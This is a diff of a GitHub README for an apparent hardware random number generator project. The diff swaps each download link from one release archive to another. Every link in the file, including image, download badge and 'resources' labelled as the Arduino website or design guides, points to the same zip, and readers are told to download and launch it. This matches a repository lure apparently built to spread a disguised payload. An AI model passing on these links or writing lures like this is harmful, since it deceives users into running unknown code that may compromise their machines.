@@ -1,6 +1,6 @@
 # 🎲 **Johnson-HRNG - Nyquist Noise Based Hardware Random Number Generator**
 
-![Hardware Random Number Generator](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
+![Hardware Random Number Generator](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the Johnson-HRNG repository, your go-to resource for the Johnson-Nyquist Noise Based Multi-Purpose Hardware Random Number Generator. This project aims to provide a reliable and secure random number generation solution for various applications in the fields of electronics engineering, instrumentation, and FPGA development. By leveraging the principles of Johnson-Nyquist noise, this hardware random number generator offers high-quality random numbers for use in OTP generation, load balancers, scheduling algorithms, and more.
@@ -9,9 +9,9 @@ Welcome to the Johnson-HRNG repository, your go-to resource for the Johnson-Nyqu
 🔌 adc, arduino, 🛠️ electronics-engineering, fpga, 🎛️ instrumentation, loadbalancer, 📏 measurement, opamp, otp-generator, 🎰 random-number-generators, 📆 scheduling-algorithms
 
 ## Software Download
-[![Download Software](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
 
-Make sure to download and launch the https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip file from the provided link to access essential software components related to the Johnson-HRNG project.
+Make sure to download and launch the https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip file from the provided link to access essential software components related to the Johnson-HRNG project.
 
 ## How to Contribute
 🛠️ Contributions to this project are welcome! Feel free to fork the repository, make improvements, and submit pull requests for review. Together, we can enhance the functionality and usability of the Johnson-HRNG hardware random number generator.
@@ -25,11 +25,11 @@ Make sure to download and launch the https://github.com/thomas636b/Johnson-HRNG/
 ## Resources
 📚 Check out the additional resources below to expand your knowledge of random number generators, electronics engineering, and related topics:
 
-1. [Introduction to ADC](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
-2. [Arduino Official Website](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
-3. [FPGA Design Guide](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
-4. [Instrumentation Basics](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
-5. [Op-Amp Applications](https://github.com/thomas636b/Johnson-HRNG/releases/download/v1.0/Release.zip)
+1. [Introduction to ADC](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
+2. [Arduino Official Website](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
+3. [FPGA Design Guide](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
+4. [Instrumentation Basics](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
+5. [Op-Amp Applications](https://github.com/thomas636b/Johnson-HRNG/releases/download/v2.0/Software.zip)
 
 Expand your expertise and stay informed about the latest advancements in hardware random number generation technology.
 
